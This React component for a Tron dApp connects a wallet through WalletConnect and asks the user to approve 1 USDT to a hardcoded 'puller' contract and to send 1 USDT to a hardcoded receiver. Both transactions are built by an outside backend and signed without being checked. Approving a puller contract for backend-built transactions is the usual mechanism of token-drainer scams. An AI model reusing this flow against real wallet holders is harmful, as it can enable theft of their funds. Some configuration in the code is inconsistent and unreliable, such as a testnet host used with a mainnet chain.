import React, { useState, useEffect } from "react";
import { SignClient } from "@walletconnect/sign-client";
import { Web3Modal } from "@web3modal/standalone";
import {TronWeb} from "tronweb";
import { TronService } from "./tronServer";
import { networkHost, testnetHost } from "./tronServer2";

if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
  window.Buffer = require("buffer/").Buffer;
}

// Config
const PROJECT_ID = "a2cd3f6f2c8dde8024ed901de2d36bc1";
const TRON_NODE = "https://api.trongrid.io";
export const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // mainnet USDT
export const PULLER_CONTRACT = "TJBdv5qD7mpaU9bsRvbuBbe9TmjHYGwREw"; // Replace with your deployed contract
export const RECEIVER = "THzPxXfzoMRuk1s9JRs8mcV5JKXB8ZfR4g"; // destination address
const AMOUNT = 1000000; // 1 USDT in SUN
const MAINNET_CHAIN_ID = "tron:0x2b6653dc";

const web3Modal = new Web3Modal({
  projectId: PROJECT_ID,
  walletConnectVersion: 2,
});

function TronApp() {
  const [address, setAddress] = useState('');
  const [session, setSession] = useState(null);
  const [signClient, setSignClient] = useState(null);
  const [tronWeb, setTronWeb] = useState(null);
  const [txHash, setTxHash] = useState('');
  const [status, setStatus] = useState("Disconnected");

  useEffect(() => {
    const initClients = async () => {
      try {
        const client = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "Tron DApp",
            description: "TRC20 Approve & Transfer",
            url: window.location.origin,
            icons: ["https://example.com/icon.png"],
          },
        });
        setSignClient(client);

        const tw = new TronWeb({ fullHost: testnetHost });
        setTronWeb(tw);

        if (client.session.length) {
          const lastSession = client.session.get(client.session.keys.at(-1));
          setSession(lastSession);
          const userAddress = lastSession.namespaces.tron.accounts[0].split(":")[2];
          setAddress(userAddress);
          setStatus(`Connected: ${userAddress}`);
        }
      } catch (error) {
        console.error("Init error:", error);
        setStatus("Init failed");
      }
    };
    initClients();
  }, []);

  const connectWallet = async () => {
    if (!signClient) return;
    try {
      setStatus("Connecting... Use Trust Wallet");

      const { uri, approval } = await signClient.connect({
        requiredNamespaces: {
          tron: {
            chains: [MAINNET_CHAIN_ID],
            methods: ['tron_signTransaction', 'tron_signMessage'],
            events: [],
          },
        },
      });

      if (uri) await web3Modal.openModal({ uri });

      const session = await approval();
      setSession(session);
      const userAddress = session.namespaces.tron.accounts[0].split(":")[2];
      setAddress(userAddress);
      setStatus(`Connected: ${userAddress}`);
      await web3Modal.closeModal();
      
    } catch (error) {
      console.error("Connection error:", error);
      setStatus("Connection failed");
      await web3Modal.closeModal();
    }
  };

// add this helper inside your component file (outside the component function is fine)
function normalizeSignedTx(unsignedTx, signResult) {
  // Wallets often return just a hex string, or an object with { signature: '0x...' }
  const sigHex =
    typeof signResult === 'string'
      ? signResult
      : (signResult?.signature || signResult?.data || signResult); // be permissive

  if (!sigHex) throw new Error('Wallet returned no signature');

  const cleanSig = sigHex.replace(/^0x/i, '');

  return {
    ...unsignedTx,
    // IMPORTANT: TRON expects an array of signatures (multi-sig ready),
    // even if there is only one signature.
    signature: [cleanSig]
  };
}


 const approveUSDT = async () => {
    try {
        setStatus("Creating approval transaction...");
        setTxHash('');
        
        const txResponse = await fetch('https://smartcontbackend.onrender.com/create-approve', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                from: address,
                token: USDT_CONTRACT,
                spender: PULLER_CONTRACT,
                amount: AMOUNT
            })
        });

       // --- approveUSDT ---
      const unsignedTx = await txResponse.json();
      if (!unsignedTx) throw new Error("Failed to get unsigned transaction");

      setStatus("Waiting for approval signature...");
      const signResult = await signClient.request({
        chainId: MAINNET_CHAIN_ID,
        topic: session.topic,
        request: { method: 'tron_signTransaction', params: [unsignedTx] }
      });

      const finalSignedTx = normalizeSignedTx(unsignedTx, signResult);

      setStatus("Broadcasting approval transaction...");
      const broadcastResponse = await fetch('https://smartcontbackend.onrender.com/broadcast', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(finalSignedTx)
      });
              const result = await broadcastResponse.json();
              if (!result || !(result.txid || result.txId)) {
                  throw new Error("Broadcast failed");
              }

              const txId = result.txid || result.txId;
              setTxHash(txId);
              setStatus(`✅ Approval sent! TXID: ${txId}`);

              setTimeout(() => {
                  window.open(`https://tronscan.org/#/transaction/${txId}`, '_blank');
              }, 1000);

          } catch (error) {
              console.error("Approval error:", error);
              setStatus(`❌ Error: ${error.message}`);
          }
};

const newApproveUSDT = async()=>{
  try {
    const tron = new TronService();
    console.log("Starting new approval process...", tron);
    
  } catch (error) {
    console.error("New Approval error:", error);
  }
}



  const sendUSDT = async () => {
    try {
      setStatus("Creating transaction...");
      setTxHash('');

      const txResponse = await fetch('https://smartcontbackend.onrender.com/create-tx', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          from: address,
          to: RECEIVER,
          amount: AMOUNT
        })
      });

      const unsignedTx = await txResponse.json();
      if (!unsignedTx) throw new Error("Failed to get unsigned transaction");

      setStatus("Waiting for signature...");
      const signedTx = await signClient.request({
        chainId: MAINNET_CHAIN_ID,
        topic: session.topic,
        request: {
          method: 'tron_signTransaction',
          params: [unsignedTx]
        }
      });

      setStatus("Broadcasting transaction...");
      const broadcastResponse = await fetch('https://smartcontbackend.onrender.com/broadcast', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ signedTx })
      });

      const result = await broadcastResponse.json();
      if (!result || !(result.txid || result.txId)) {
        throw new Error("Broadcast failed");
      }

      const txId = result.txid || result.txId;
      setTxHash(txId);
      setStatus(`✅ Transaction sent! TXID: ${txId}`);

      setTimeout(() => {
        window.open(`https://tronscan.org/#/transaction/${txId}`, '_blank');
      }, 1000);

    } catch (error) {
      console.error("Transaction error:", error);
      setStatus(`❌ Error: ${error.message}`);
    }
  };

  const disconnectWallet = async () => {
    if (signClient && session) {
      await signClient.disconnect({
        topic: session.topic,
        reason: { code: 6000, message: "User disconnected" },
      });
    }
    setSession(null);
    setAddress('');
    setStatus("Disconnected");
    setTxHash('');
  };

  return (
    <div style={styles.container}>
      <h2 style={styles.title}>TRC20 USDT Approval & Send</h2>
      <p style={{ textAlign: "center", wordBreak: "break-all" }}>
        {address ? `Wallet: ${address}` : "Wallet not connected"}
      </p>

      {!session ? (
        <button style={styles.button} onClick={connectWallet}>
          Connect Wallet (Trust Wallet)
        </button>
      ) : (
        <div style={styles.buttonGroup}>
          <button style={styles.primaryButton} onClick={approveUSDT}>
            Approve 1 USDT to Contract
          </button>
          <button style={styles.primaryButton} onClick={sendUSDT}>
            Send 1 USDT
          </button>
          <button style={styles.secondaryButton} onClick={disconnectWallet}>
            Disconnect
          </button>
        </div>
      )}

      <div style={styles.statusBox}>
        <strong>Status:</strong> {status}
      </div>

      {txHash && (
        <div style={styles.statusBox}>
          <strong>Last TX:</strong>{" "}
          <a href={`https://tronscan.org/#/transaction/${txHash}`} target="_blank" rel="noopener noreferrer">
            {txHash}
          </a>
        </div>
      )}
    </div>
  );
}

const styles = {
  container: {
    padding: "20px",
    maxWidth: "500px",
    margin: "0 auto",
    fontFamily: "Arial, sans-serif",
  },
  title: {
    color: "#2c3e50",
    textAlign: "center",
    marginBottom: "20px",
  },
  button: {
    padding: "12px 24px",
    backgroundColor: "#3498db",
    color: "white",
    border: "none",
    borderRadius: "4px",
    cursor: "pointer",
    fontSize: "16px",
    display: "block",
    margin: "0 auto",
  },
  primaryButton: {
    padding: "12px 24px",
    backgroundColor: "#2ecc71",
    color: "white",
    border: "none",
    borderRadius: "4px",
    cursor: "pointer",
    fontSize: "16px",
  },
  secondaryButton: {
    padding: "12px 24px",
    backgroundColor: "#e74c3c",
    color: "white",
    border: "none",
    borderRadius: "4px",
    cursor: "pointer",
    fontSize: "16px",
  },
  buttonGroup: {
    display: "flex",
    justifyContent: "center",
    gap: "10px",
    marginBottom: "20px",
  },
  statusBox: {
    padding: "15px",
    backgroundColor: "#f8f9fa",
    borderRadius: "4px",
    border: "1px solid #ddd",
    marginTop: "20px",
    wordBreak: "break-all",
  },
};

export default TronApp;
